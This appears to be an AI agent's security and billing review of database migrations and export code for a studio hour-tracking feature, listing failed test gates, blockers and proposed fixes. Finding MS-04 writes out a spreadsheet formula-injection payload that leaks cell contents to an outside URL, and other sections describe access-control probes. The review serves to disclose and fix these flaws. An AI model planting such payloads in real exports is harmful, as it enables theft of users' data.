# Final integration review — money + security — round 1

`clean = false`

3 blockers, 3 majors, 4 minors, 9 notes. Every finding below was measured on the isolated
stack `patina-hours` (127.0.0.1:54422) against `hour-tracking/integration` @ `944e12a5c`,
worktree `/Users/kody/Code/patina-merged/.codex/worktrees/agent-integration`. Nothing was
reset; every mutation ran inside a transaction that was rolled back. Prod was not touched.

---

## §0 — Gates run, verbatim

### (a) SQL suite — every file under `supabase/tests`, `ON_ERROR_STOP=1`, `-H 127.0.0.1 -p 54422`

The repo runner `scripts/run-sql-tests.sh` could not run in this sandbox (`mktemp: mkdtemp
failed on /var/folders/…: Operation not permitted`, line 94 — `TMPDIR` is not honoured
here), so the same loop was run by hand, one `psql -v ON_ERROR_STOP=1 -f` per file.

**190 files · 163 PASS · 27 FAIL.** All fourteen hour-tracking files pass:

```
PASS  supabase/tests/billing/legacy_project_studio_stamp_test.sql
PASS  supabase/tests/billing/time_claim_atomicity_test.sql
PASS  supabase/tests/billing/time_entry_ledger_test.sql
PASS  supabase/tests/billing/time_log_rpc_test.sql
PASS  supabase/tests/billing/time_rate_resolution_test.sql
PASS  supabase/tests/billing/time_unbilled_view_repair_test.sql
PASS  supabase/tests/field/time_entry_activity_travel_test.sql
PASS  supabase/tests/rls/internal_time_test.sql
PASS  supabase/tests/rls/project_hours_total_test.sql
PASS  supabase/tests/rls/studio_hours_rollup_test.sql
PASS  supabase/tests/rls/studio_member_rates_test.sql
PASS  supabase/tests/rls/time_entry_admin_write_test.sql
PASS  supabase/tests/rls/time_entry_auto_roster_test.sql
PASS  supabase/tests/rls/time_entry_studio_stamp_test.sql
PASS  supabase/tests/rls/00563_proposal_signing_multi_studio.test.sql
PASS  supabase/tests/commercial/agreement_fee_schedules_test.sql
PASS  supabase/tests/commercial/agreement_parts_test.sql
```

Of the 27 reds, **24 are allowlisted** in `supabase/tests/KNOWN_FAILURES.md`. **Three are
not** — two of them caused by this program (MS-02, MS-03), one pre-existing (N-06):

```
FAIL  supabase/tests/edge_api/public_rpc_authorization_contract_test.sql
      ERROR: 00511 must not auto-derive a studio for a non-designer lead   (:171)
FAIL  supabase/tests/edge_api/public_sd_hardening_contract_test.sql
      ERROR: an exact 00511 dependency profile drifted                     (:2424)
FAIL  supabase/tests/capture_enrichment/target_type_visibility_test.sql
      ERROR: FAIL c2: an org co-member must not see a run targeting a
             non-inbox field_capture they do not own, got 1                (:153)
```

### (b) Edge functions — `deno test --allow-all time-nudges/ digest-dispatcher/`

```
ok | 18 passed | 0 failed (67ms)
  digest-dispatcher/status.test.ts — 2 tests
  time-nudges/index.test.ts        — 16 tests
```

### (c) `pnpm --filter @patina/supabase type-check` → clean (`tsc --noEmit`, no output)

### (d) `pnpm --filter @patina/supabase test`

```
Test Files  102 passed (102)
     Tests  1259 passed | 12 skipped (1271)
```

### (e) `pnpm --filter @patina/designer-portal type-check` → clean (`tsc --noEmit`, no output)

### (f) Generated types in sync

`SUPABASE_DB_URL=postgresql://postgres:postgres@127.0.0.1:54422/postgres pnpm db:generate`
then `git diff --stat -- packages/supabase/src/database.types.ts` → **no output**. In sync.

### (g) Migration idempotence — second run of every file, each in a rolled-back transaction

All 24 (`00595`–`00608`, `00610`–`00616`, `00618`–`00620`) re-applied clean, every DO-block
assert passing. None contains `CONCURRENTLY`, `ALTER TYPE … ADD VALUE` or `VACUUM`, so the
transactional replay is a faithful second-run test.

```
IDEMPOTENT-OK  00595 00596 00597 00598 00599 00600 00601 00602 00603 00604 00605 00606
IDEMPOTENT-OK  00607 00608 00610 00611 00612 00613 00614 00615 00616 00618 00619 00620
```

### (h) `_shared` edge-function files

`git diff --name-only origin/main...hour-tracking/integration | grep -c '_shared'` → **0**.
No `_shared/*` file changed, so **no importer cascade**. Six function files changed, in two
functions only: `time-nudges/{index,logic,index.test}.ts` and
`digest-dispatcher/{index,status,status.test}.ts`. `digest-dispatcher` imports
`../_shared/send-email.ts`, which is unmodified — it still needs a redeploy of its own,
but nothing else does.

### (i) 00614's cron target, and the digest exclusion

`cron.schedule('time-nudges-hourly','0 * * * *', $$SELECT public.invoke_edge_function('time-nudges', '{"rule":"running_timer"}'::jsonb);$$)`
— `'time-nudges'` matches the directory `supabase/functions/time-nudges/` and the new
`config.toml [functions.time-nudges]` entry exactly. Guarded unschedule precedes it.
**Correct.**

Digest exclusion holds for **both** types: `DIGEST_EXCLUDED_TYPES`
(`digest-dispatcher/status.ts`) carries `time_entry_running_long` **and**
`time_weekly_unlogged_reminder`, and it is applied to the collection query at
`digest-dispatcher/index.ts:275` (`.filter((r) => !DIGEST_EXCLUDED_TYPES.has(r.type))`).
Pinned by the passing test *"hour-tracking nudge rows never enter the digest collection"*.

---

## §1 — BLOCKERS

### MS-01 · BLOCKER · confidence HIGH (measured end to end, twice) — an hour whose rate resolves `'none'` is `authorized`, reaches the invoice composer at **$0.00**, is tickable, and `claim_time_entries` locks it there

`classify_project_time_entry_authority`'s **non-services** branch sets
`billing_state := 'authorized'` unconditionally, then `rated_amount_cents := CASE WHEN
duration_minutes IS NOT NULL AND v_rate_cents IS NOT NULL THEN … END` — a `CASE` with no
`ELSE`, so a `'none'` resolution lands `authorized / hourly_rate_cents NULL / rated_amount_cents NULL`.
`project_unbilled_time` filters on `billing_state = 'authorized'` and then
`COALESCE(hourly_rate_cents, 0)` / `COALESCE(rated_amount_cents, …0)`, so the row surfaces
as `$0.00/h · $0.00`.

**Two reachable shapes, both measured through RLS as the project's designer:**

```
-- (i) legacy project, studio_id IS NULL, non-services
INSERT … project b0000000-…-00d3, 120 min, billable
 billing_state | rate_source | hourly_rate_cents | rated_amount_cents
 authorized    | none        |                   |

SELECT … FROM project_unbilled_time WHERE project_id = 'b0000000-…-00d3';
 duration_minutes | resolved_rate_cents | amount_cents | billing_state
              120 |                   0 |            0 | authorized

-- (ii) SAME project with studio_id stamped, but the studio has no rate-card row
--      for the member — i.e. every studio that has not filled its rate card
 billing_state | rate_source | hourly_rate_cents | rated_amount_cents
 authorized    | none        |                   |
 resolved_rate_cents | amount_cents | billing_state
                   0 |            0 | authorized
```

And the claim goes through, with the invoice lock closing behind it:

```
SELECT public.claim_time_entries('<draft invoice>', ARRAY['1111…1111']);
 claimed
 11111111-1111-1111-1111-111111111111

 id        | locked | rated_amount_cents | rate_source
 1111…1111 | t      |                    | none
```

**The composer cannot filter it even if it wanted to.** `project_unbilled_time` exposes
**no `rate_source` column** (probed:
`SELECT count(*) FROM information_schema.columns WHERE table_name='project_unbilled_time' AND column_name='rate_source'` → **0**),
and `invoice-composer.tsx` contains no occurrence of `rate_source`, `rate pending` or any
zero-amount guard (grepped — the only `pending` in the file is the milestone comment at
`:194`). The row renders as `{formatCurrency(entry.resolved_rate_cents)}/h` ·
`{formatCurrency(entry.amount_cents)}` at `:656-662`, is tickable at `:630`, and is swept
in by **"tick all"** at `:605-609`.

**This contradicts two rulings by name.** HT-3-a's ruled remedy says *"the composer, not the
resolver, is where a `'none'` row must be kept off an invoice."* HT-26 rules that *"an
unresolved rate prints 'rate pending' instead of a blank."* Both were built — in the Hours
ledger (`hours-ledger.tsx:1430, :2009-2012`) and on Patina Field
(`FieldHours.swift:98`) — and **neither was built at the one surface that turns an hour into
money.**

**Why the blast radius is not the one HT-6-a measured.** HT-6-a measured the *existing*
Strata population (one row, one test project) and ruled the write-down acceptable. This is a
different population: **new** rows, logged after the push, on the projects HT-3-g's own cost
notes deliberately leave `studio_id IS NULL` (cost notes (i), (ii), (v)) plus every project
of a studio that has not yet written a rate card. P-4 does not cover new rows.

**Fix (three lines, two of them a backstop):**
1. Add `te.rate_source` (and ideally `te.rate_role`) to `project_unbilled_time`; regenerate types.
2. In `useUnbilledTime` / `filterProjectUnbilledEntries`, keep `'none'` rows out of the
   tickable set — or render them with "rate pending" and `disabled`, which is the HT-26
   shape and tells the studio what to repair.
3. Server backstop, so no caller can do this by hand:
   `claim_time_entries` gains `AND rate_source IS DISTINCT FROM 'none'`, asserted in
   `supabase/tests/billing/time_claim_atomicity_test.sql`.

---

### MS-02 · BLOCKER · confidence HIGH (measured with a negative control) — `00603` breaks the `00511` authorization contract; `public_rpc_authorization_contract_test.sql` is RED and not allowlisted

`set_project_studio_id_owned` (00603, trigger `zzz_set_project_studio_id_owned_trg`) applies
the HT-3-b tier rule to **every** project INSERT whose `designer_id` is non-NULL. It asks
nothing about whether that lead is a designer. `00511`'s `set_project_studio_id` deliberately
declines to derive a studio for a non-designer lead, and
`supabase/tests/edge_api/public_rpc_authorization_contract_test.sql:161-171` asserts that
refusal.

Measured, in one rolled-back transaction — a `super_admin` profile holding an `admin`
(non-owner, non-guest) seat in one active `design_studio`, inserting a project with
`studio_id` unnamed:

```
            stamped_with_00603            |         note
 c9990000-0000-4000-8000-000000000010     | contract expects NULL

ALTER TABLE public.projects DISABLE TRIGGER zzz_set_project_studio_id_owned_trg;
 without_00603
              (NULL)
```

The trigger is the cause; disabling it restores the contract's expectation exactly.

**Two reasons this is a blocker and not a note.** First, the file is **not** in
`KNOWN_FAILURES.md` (checked against every entry) — it is a genuine broken gate. Second,
**this program edited that file** (the diff re-registers the `Team can view their project
time entries` qual at `:533-546` for HT-10-a) but the file now aborts at `:171`, 362 lines
earlier, so **the re-registered qual is never asserted** — the program's own W2 narrowing
has no live coverage in the contract that exists to hold it.

The behavioural half matters too: a project led by a non-designer now silently acquires a
pricing studio, which is the key for `time_entries_owner_admin_{read,update,delete}`,
`project_hours_total`'s third leg, `00604`'s ledger `studio_id` and the audit row's
`organization_id`. That is a read+write grant handed to that studio's owner/admin on a
project `00511` decided was not theirs.

**Fix:** either bound `set_project_studio_id_owned` to a lead who holds a designer-domain
role (matching 00511's own condition) and leave the assertion alone, or — if the tier rule
is meant to bind regardless — move the assertion with an explicit ruling, as the program did
for the `Team can view` qual. Do not simply allowlist it.

---

### MS-03 · BLOCKER · confidence HIGH (hash measured) — `00619` moved a pinned SECURITY DEFINER body and the SD-hardening manifest was not updated; `public_sd_hardening_contract_test.sql` is RED and not allowlisted

`supabase/tests/edge_api/public_sd_hardening_contract_test.sql:1912-2014` pins nine definer
routines by `body_sha256`, and `:2276-2301` asserts none has drifted. It fails:

```
ERROR:  an exact 00511 dependency profile drifted
```

The drifted row is `public._countersign_design_services_agreement_impl(uuid,text,jsonb)` —
the function `00619_countersign_rate_binding_carry.sql` redefines:

```
manifest expects : 3ca87ae1f02130749ae7886ab8b3f44d0ed700906c5ff2dbd28ab83a7f099d0e
live on the stack: 33af21f76ae82453a95a5cbbf8908d07e9cc4df02e09f82dc69dcd2a5786dc6a
```

Every prior mover of this body (00566, 00575, 00577, 00578/R52) updated the hash **and left
a paragraph in the manifest** saying what moved and which contracts in the file still hold —
the signature, the ACL, the `issue_invoice_for_actor` call site, the `'commercialDocumentId'`
anchor, the authority lock order. `00619` did neither. The file is the repo's
body-pinning contract for its most privileged definer functions, and this one signs
agreements and issues invoices.

**Fix:** update the manifest row's `body_sha256` to the live hash and add the paragraph in
the established shape — what 00619 changed (the rate-role binding carry), that it takes no
new lock, that signature / arguments / result type / `proconfig` / `prosecdef` / ACL are
unchanged, and that the caller and lock-order contracts below still hold. Then re-run the
file green. It is a five-minute change; shipping without it means the hardening contract is
red on arrival and nobody re-reviewed the new body.

---

## §2 — MAJORS

### MS-04 · MAJOR · confidence HIGH (code read) — CSV formula injection in the new hours export, through a field the subject sets herself

`apps/designer-portal/src/lib/document/time-export.ts:60-64`:

```ts
function csvField(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '""';
  const s = String(value).replace(/[\r\n]+/g, " ");
  return `"${s.replace(/"/g, '""')}"`;
}
```

RFC-4180 quoting only. No neutralisation of a leading `=`, `+`, `-`, `@` or tab. Three of
the fourteen columns carry free text: `member_name` (`:105`), `project_name` (`:107`),
`client_name` (`:108`). **`member_name` is `profiles.full_name`, which the member sets about
herself** — so a studio member can name herself
`=HYPERLINK("https://…?d="&A1&B1,"Total")` and the owner's Friday export exfiltrates the
sheet the moment she opens it in Excel or Sheets and accepts the enable prompt. The export
is the bookkeeper's artefact: opening it in a spreadsheet is the whole point of HT-20.

Honest framing: the precedent this file names, `supabase/functions/qbo-export/index.ts:170-173`,
has the identical shape, so the pattern is pre-existing in the repo. It is reported as a
major rather than a note because this is a **new** shipped surface, the injecting field is
**self-set by the person being audited**, and the fix is four characters of prefix:

```ts
const s = String(value).replace(/[\r\n]+/g, " ");
const guarded = /^[=+\-@\t]/.test(s) ? `'${s}` : s;
return `"${guarded.replace(/"/g, '""')}"`;
```

Worth taking in `qbo-export` at the same time.

### MS-05 · MAJOR · confidence HIGH (measured on the stack; Strata NOT measured) — the population `00620` will leave NULL has never been counted, and the local fixture says the "no tier answers" shape is the **default**, not the exotic case

On the isolated stack, after every migration including `00620`:

```
select count(*) from projects;                      -> 6
select count(*) from projects where studio_id is null; -> 5
```

and `designer_tier_pricing_studio` answers `none` for **all six**, because the seeded
designer holds `owner` seats in **two** active `design_studio` organizations — her named
studio `b0000000-…-0001` and the workspace `00295` auto-provisioned at her designer grant
(`ff1fad22-…`). Two owned candidates, no employer seat → ambiguous → NULL. That is exactly
HT-3-g cost note (i), which also records that **no party may then stamp those projects**:
HT-3-g(3)'s "DESIGNERS NEVER STAMP" plus an empty employer tier leaves the repair as a
*seat change*.

Every hour on those five projects prices `'none'` → `$0` → and by **MS-01** reaches an
invoice at `$0`. The two findings compound: MS-01 is the mechanism, MS-05 is the size of the
population it acts on, and nobody has measured that size on Strata.

`00620` itself is correct and safe — it `RAISE NOTICE`s five numbers and asserts its own
arithmetic — but the NOTICE is only seen *after* the push, and HT-3-g AMENDED (a) explicitly
requires "the ship sees the cost as a number."

**Fix (no code):** before the push, run `00620`'s own statement read-only against Strata (it
is a `WITH … SELECT count(*)` away from being a pure query) and record the five numbers —
`stamped-employer`, `stamped-owned`, `left-null-ambiguous`, `left-null-roster-key`,
`left-null-author-key` — plus `SELECT count(*) FROM projects WHERE studio_id IS NULL`. If
`left-null-ambiguous` is large, MS-01's fix is not optional and Leah needs telling before,
not after.

### MS-06 · MAJOR · confidence HIGH (tool failure, reproduced) — W7-R6-04 could not be verified: the `agreement-parts` flag's live rollout is **unknown**

The brief asks me to confirm the pre-existing `agreement-parts` flag is 100% live and say
so. **I could not.** The PostHog MCP refuses:

```
MCP server "plugin:posthog:posthog" requires re-authorization (token expired)
```

(This matches the standing owed item "PostHog MCP key" in project memory.)

The studio half of HT-4 — the rate-card role picker on the studio settings page — is gated
on it and is fail-closed: `account-studio-page.tsx:198`
`const { value: agreementPartsOn } = useFeatureFlag('agreement-parts');`, with the file's own
comment at `:1494` noting `useFeatureFlag` reads `false` while unresolved. If the flag is not
at 100% at ship, **HT-4's studio half does not exist in production** and W7's "PASS" on that
row is unverified.

**This is a hard pre-ship gate: verify the rollout in the PostHog UI (or restore the MCP
token and re-check) before the push, and say the number in the ship report.**

---

## §3 — MINORS

### MS-07 · MINOR · confidence HIGH (probed) — `log_time` accepts a span that ends in the future, and such an hour is `authorized` and claimable

`project_time_entries` carries nine CHECK constraints and **none** of them bounds
`started_at` (verified from `\d+`). `log_time` (00608) validates `p_entry_id`, `auth.uid()`,
`p_billable IS NOT NULL` and `p_duration_minutes >= 1`, and nothing else — so a
`started_at` in the future, or a past `started_at` with a duration that runs past `now()`,
is accepted, classified `authorized`, and claimable onto an invoice. This is the server half
of **W6-R3-07** and **W7-R5-07** together; both were carried as open, and the missing piece
was whether the row is merely odd or actually billable. It is billable.

**Cheap fix, one line in `log_time`:**
`IF p_started_at > now() + interval '1 day' THEN RAISE … END IF;` — a day of slack covers
every studio timezone and the noon-UTC filing rule (HT-13-a) while refusing the
Field stepper's 2.5-hours-into-the-future span.

### MS-08 · MINOR · confidence HIGH (code read) — `FieldHours.worthLabel` prints "Billable" for a legacy `rate_source IS NULL` row (W6-R3-06, unchanged)

`apps/mobile/Capture/CaptureKit/CaptureKit/Domain/FieldHours.swift:98` is still
`if row.rateSource == "none" { return "Rate pending" }`. `rate_source` is nullable with no
default and P-4 forbids backfill, so every pre-00600 row keeps NULL and reads as priced on
the phone, to the person whose pay it is. One line:
`if row.rateSource == nil || row.rateSource == "none"`. Recommended to be taken **with**
MS-01's fix, since both are the same sentence in two places.

### MS-09 · MINOR · confidence HIGH (reproduced) — `scripts/run-sql-tests.sh` cannot run in a sandboxed agent session

`LOG_DIR="$(mktemp -d …)"` at `:94` fails with `Operation not permitted` and the script then
writes to `/known_failures.normalized` and `/files.list` and exits
`error: no .sql files found`. Every subsequent agent that tries to run the program's own
DB gate hits this. One line: honour `${TMPDIR:-}` explicitly, or
`mktemp -d "${TMPDIR:-/tmp}/run-sql-tests.XXXXXX"`.

### MS-10 · MINOR · confidence MEDIUM — `studio_member_rates` has an `admin_update` policy with no subject guard, where `admin_insert` has one

`studio_member_rates_admin_insert` requires the subject to hold an active non-guest seat in
the studio; `studio_member_rates_admin_update` requires only
`is_org_admin_or_owner(studio_id)` in both `USING` and `WITH CHECK`. So an admin can keep an
open rate row alive for someone who has since left the studio, where she could not create
one. No escalation (`guard_studio_member_rate_history` freezes `studio_id`, `user_id`,
`effective_from`, `effective_to`, `created_at` and `original_created_by`, and re-stamps
`created_by` to the actor whenever the number moves), and the resolver would price that hour
anyway off `projects.studio_id`. Recorded as an asymmetry, not an exploit.

---

## §4 — NOTES

- **N-01 · note (no ruling owed)** — `project_hours_total` is an arithmetic channel onto a
  colleague's rate on a **two-contributor** project: a rostered member knows her own minutes
  and amount, so `total − hers` yields the colleague's minutes and money and therefore her
  effective hourly rate. HT-10 rules the aggregate explicitly ("members read own rows plus
  aggregates on rostered projects"), and the program **strictly narrows** the prior state —
  before `00606` she read the colleague's row, rate included, outright. Recorded so it is
  not rediscovered as a regression.
- **N-02 · note** — `stamp_time_entry_updated_by()` is the only function added by this
  program with **no `SET search_path`** (`proconfig` is NULL; every other new function pins
  `public, pg_temp`). It is SECURITY INVOKER and its only reference, `auth.uid()`, is
  schema-qualified, so there is no exploit — a quality-bar gap against
  patina-db-migrations' checklist.
- **N-03 · note** — `audit_time_entry_change` files
  `organization_id = project_pricing_studio_id(OLD.project_id)`, which is **NULL for exactly
  the legacy population `00620` leaves NULL** (`audit_logs.organization_id` is nullable, so
  the INSERT succeeds). `audit_logs`' only SELECT policies are *Org admins can view org audit
  logs* (keyed on `organization_id`) and *Users can view their audit logs* (keyed on
  `user_id`), so those HT-23 trace rows are readable **only by the actor who made the edit**.
  The trace exists and is invisible to the studio on the same rows whose money is also
  invisible to it.
- **N-04 · note** — `time_entry_ledger` is granted `arwdDxtm` to `authenticated` — INSERT,
  UPDATE, DELETE and TRUNCATE included. Harmless in fact (a `LEFT JOIN` view is not
  auto-updatable, and the view is `security_invoker=true`), but wider than the SELECT it
  needs. `project_unbilled_time` carries the same legacy shape plus an `anon` grant, which
  RLS closes (probed: `anon` reads 0 rows of `project_time_entries` and
  `project_unbilled_time`, and is denied outright on `studio_member_rates`,
  `time_entry_ledger`, `project_pricing_studio_id`, `project_hours_total`,
  `studio_hours_rollup` and `resolve_time_rate_cents`).
- **N-05 · note** — `guard_time_entry_studio_id` takes its service bypass from
  `auth.jwt() ->> 'role' <> 'service_role'` — a **claim** compare — where the program's
  sibling guards (`guard_commercial_time_entry_derived_fields`,
  `guard_studio_member_rate_{insert,history}`) use `current_user = 'postgres'`. Equivalent
  under PostgREST, and recorded only because the repo carries a standing warning about
  string-comparing the service-role credential.
- **N-06 · note (gate hygiene, pre-existing)** —
  `supabase/tests/capture_enrichment/target_type_visibility_test.sql` is RED and **not** in
  `KNOWN_FAILURES.md`, failing at `FAIL c2` on the same `00584` `field_captures_studio_*`
  cause the program already documented for its sibling
  `supabase/tests/field/field_capture_note_routing_test.sql`. No migration in this diff
  touches `field_captures` (two mentions, both comments and one view read). **Not this
  program's**, but the allowlist entry it added for the sibling missed this file; add it in
  the same shape so the next reviewer's 27 reds are 27 documented reds.
- **N-07 · note (ruled residual, accepted)** — `time-nudges`' `running_timer` arm is
  ungated by design (D-R2-01, recorded in `config.toml` and `00614`'s banner). Any holder of
  the publishable anon key committed in every portal's `wrangler.jsonc` can POST and force a
  privileged service-role sweep at any rate. Bounded: the response carries counts only
  (`{rule, scanned, recorded, skipped}`, `logic.ts:107-112`) with no identifiers, and
  `00614`'s two partial UNIQUE indexes make the writes idempotent. The one cost not named in
  the banner is that **every such POST also opens a `job_runs` row** (`index.ts:247-249`), so
  the noise floor of that table is caller-controlled.
- **N-08 · note** — `00609` and `00617` are unused gaps in the reserved `00595`–`00620`
  range (`00617` is recorded as deliberately unused in the W6 review). Harmless — lexical
  push order is unaffected — recorded so nobody hunts for a missing file.
- **N-09 · note** — the tier rule fails closed on every odd shape the brief names. Probed
  directly, no raises: `NULL` designer → `none`; an unknown uuid → `none`; a `removed` seat →
  `none`; an `active` seat → `employer`; a `suspended` org → `none`; a `pending_approval` org
  → `none`; a non-`design_studio` org → `none`; a `guest` seat → `none`. Both `00620`
  predicates return `false` on NULL inputs. `00620` guards `designer_id IS NOT NULL` in its
  own `WHERE`. **`pending_approval` is the one live-ish status worth naming**: a real studio
  in that state prices nothing, and `00295` provisioning always writes `'active'`, so it can
  only arise from an admin-created studio.

---

## §5 — Carried items, dispositioned

| Item | Verified state | Disposition |
|---|---|---|
| **W6-R3-01** note field 20px / null `AXLabel` | Still present (no `W6-fix-r3.md` exists) | **Accept as residual** — iOS AX, outside the money/security lens; hand to the iOS reviewer |
| **W6-R3-02** `log()` swallows a failed `store.save()` then dismisses | Still present | **Accept as residual** — data-loss-shaped but local to the outbox, which re-drains; not a money or read exposure |
| **W6-R3-06** `rate_source` NULL renders "Billable" | Verified still present: `FieldHours.swift:98` keys the literal `"none"` | **MS-08 — take the one-line fix with MS-01.** Same sentence, two surfaces |
| **W6-R3-07** stepping duration with no open visit files a future span | Verified: `step(by:)` (`FieldLogTime.swift:158-160`) moves only `durationMinutes`; `startedAt` is anchored at `now − 30m` (`:137`) and never moves. **Server half newly measured: the resulting row is `authorized` and claimable** | **MUST FIX BEFORE SHIP (cheap) — promoted to MS-07.** One `RAISE` in `log_time` closes both this and W7-R5-07 |
| **W6-R3-10** V4 stepper/billable gated on `projectID` | Unmeasured by W6; not re-measured here (no device/Simulator in this lens) | **Accept as residual** — refer to the iOS reviewer; state plainly in the ship report that those two controls have never been measured at 390 |
| **W7-R6-03** an emptied rate card passes readiness | Confirmed, and the **consequence is benign relative to MS-01**: an emptied card is a *services* project shape, and the classifier files those `pending_authorization`, which `project_unbilled_time` filters out and `claim_time_entries` refuses. The money is visibly stranded, not silently zeroed | **Accept as residual, with that reason recorded.** The readiness gap is worth closing later, not at ship |
| **W7-R6-05 / W7-R5-03** sub-44px `Remove` | Not re-measured (UI lens) | **Accept as residual** — §A deviation, outside this lens |
| **W7-R5-02** no `sortOrder` re-index after `Remove` | Not re-measured (UI lens) | **Accept as residual** |
| **W7-R5-04** trim drops the tail, not the unbindable row | Not re-measured (UI lens) | **Accept as residual** |
| **W7-R6-04** the studio half of HT-4 sits behind `agreement-parts` | **Could not verify — PostHog MCP token expired** | **MUST VERIFY BEFORE SHIP — MS-06.** Not dispositioned |
| **W7-R5-07** noon-UTC can file `started_at` in the future | Re-probed: `project_time_entries` carries nine CHECKs, none on `started_at` | **Folded into MS-07** — one server bound closes both |
| **n7-02** studio money under the word "mine" | Not re-measured (UI lens) | **Accept as residual** |
| **n7-05** a two-studio viewer reads only the alphabetical first | Not re-measured (UI lens) — but **flagged**: MS-05 shows the two-studio shape is the *default*, not the edge, so this residual is more reachable than its grade implies | **Accept as residual, re-flagged.** Re-grade alongside MS-05 |
| **n7-06** same-day second save re-authors | **Checked for money consequence: none.** `guard_studio_member_rate_history` re-stamps `created_by` to the actor **only when `hourly_rate_cents` moves**, and simultaneously COALESCEs the displaced author into `original_created_by`, which the resolver's arm's-length test and `stamp_project_pricing_studio` both read. A subject who re-stamps herself makes `created_by = user_id`, which fails the resolver **closed** to `'none'` — never open to a number she set | **Accept as residual** — authorship display only |
| **W3-R5-m3** Enter submits with no note | Not re-measured (UI lens) | **Accept as residual** |
| **W3-R5-m5** e2e serial-mode first case pre-existing red | Not re-run (portal e2e outside this lens) | **Accept as residual, pre-existing** |

---

## §6 — Attacks run that found nothing (recorded so they are not repeated)

Each was executed through RLS on the isolated stack with `SET LOCAL role authenticated` and
a `request.jwt.claims` sub, inside a rolled-back transaction.

- **Can a single account move its own resolved rate?** No path found beyond the ones already
  ruled. `resolve_time_rate_cents`'s studio step is `projects.studio_id` and nothing else
  (HT-3-g(1) — verified in the installed body: there is no `organization_members` read for
  studio choice anywhere in it); the arm's-length conjunct
  (`rate.created_by IS DISTINCT FROM rate.user_id OR <subject is an active owner of that studio>`)
  is present; `stamp_project_pricing_studio` carries all three bounds of the corrected
  HT-3-g(b) — caller is the current designer, holds an active **owner** seat in the studio
  named, and the studio being **replaced does not employ** that designer
  (`v_replaced_employs_designer`, verified in the installed body). The recorded residual —
  she leaves the employer's seat first, then re-points — stands, and is a seat act.
- **Can a member read a teammate's row, notes or rate?** No. `Team can view their project
  time entries` and `time_entries_studio_read` both carry `user_id = auth.uid()`;
  `studio_member_rates_read_self_or_admin` is `user_id = auth.uid() OR is_org_admin_or_owner`;
  `time_entry_ledger` carries **no `notes` column** and neither does the rollup's return
  shape (HT-36, verified against the installed view and function bodies); the CSV omits
  notes by construction (`time-export.ts:14`, columns at `:105-118`). The one residual is
  the arithmetic channel, N-01.
- **Can an invoice reach a pending or internal hour?** No. `claim_time_entries` requires
  `invoice_id IS NULL AND billable AND duration_minutes IS NOT NULL AND (billing_state =
  'authorized' OR billing_state IS NULL)`, and the CHECK
  `project_time_entries_internal_scope_ck` forces `billable = false` whenever
  `project_id IS NULL`, so an internal hour can never be billable, never `authorized`, never
  claimed. `pending_authorization` is excluded by the predicate. (The gap is the *rate*, not
  the state — MS-01.)
- **Can one account hold the running slot twice?** No. `uniq_project_time_entries_running_timer`
  is `UNIQUE (user_id) WHERE duration_minutes IS NULL` — one running row per user across
  every project and every internal hour. `start_timer` closes-then-opens in one statement
  with a 2-attempt retry on `unique_violation`. The stuck-slot shape I went looking for (a
  running timer on a project the member was removed from) is **not reachable**: the close
  UPDATE is still admitted by `time_entries_studio_update_own` for any studio co-member, and
  a non-co-member cannot start a timer there in the first place (`time_entry_auto_roster`
  seats only where `is_studio_comember(p.designer_id)`).
- **Can a member log on a project she cannot see?** Only via HT-25's ruled auto-roster, and
  **it grants no collateral read**. I checked whether the fresh `project_team_members` seat
  unlocks anything new: 12 policies across 9 tables key on `is_project_team_member`
  (`margin_notes`, `project_documents`, `project_parties`, `project_tasks`,
  `project_team_members`, `project_time_entries`, `projects`, `sms_conversations`,
  `sms_messages`) — and **every one of those nine already carries an `is_studio_comember`
  SELECT/ALL policy** from the 00584 sweep, so a caller who passes auto-roster's
  co-membership gate could already read all of them. Measured: the seat appears (0 → 1); no
  new table becomes readable. **No finding.**
- **`anon` and `service_role`.** `anon` is closed on every new object (see N-04).
  `guard_commercial_time_entry_derived_fields` and both `studio_member_rates` guards bypass
  only for `current_user = 'postgres'`, so `service_role` is held to the same rules as a
  portal caller — fail-closed in the right direction.
- **`00620` against Strata's real shapes.** Nine shapes probed, no raise, every odd input
  answering `'none'` (N-09). Its three ASSERTs are arithmetic identities over its own
  statement and cannot fail on data. It runs as the migration role, so `00563`'s migration
  arm admits it.
- **Idempotence.** All 24 migrations re-applied clean in a rolled-back transaction, DO-block
  asserts included (§0(g)).

---

## §7 — What I did NOT verify

- **Prod / Strata was not touched** — not by SQL, not read-only. MS-05's counts and MS-06's
  flag rollout are both unmeasured there and are the two pre-ship checks I am handing back.
- **The `agreement-parts` rollout** — PostHog MCP token expired (MS-06).
- **iOS** — no Simulator or device pass. W6-R3-01, -02, -10 are dispositioned on code
  reading only.
- **Portal e2e / Playwright** — not run; W3-R5-m5 is carried unverified.
- **`pnpm lint`** — not run anywhere; outside designer-portal its config does not resolve, so
  a green there would prove nothing (patina-verification).
- **`admin-portal build`** — not run. No file under `apps/admin-portal` is in this diff, but
  `packages/supabase` is, and that is the repo's strictest gate for a shared-package edit.
  Someone should run it before the push.
- **A full `supabase db reset`** — deliberately not run; I was not the named agent. The
  idempotence evidence is a second-run replay against the already-reset stack, which is the
  strictly harder half of the test but does not re-prove the first run.
- **`filterProjectUnbilledEntries`' defensive filter** — read, not exercised against a
  `'none'` row; the composer's behaviour in MS-01 was established from the view, the hook's
  mapping and the JSX, not from a rendered page.
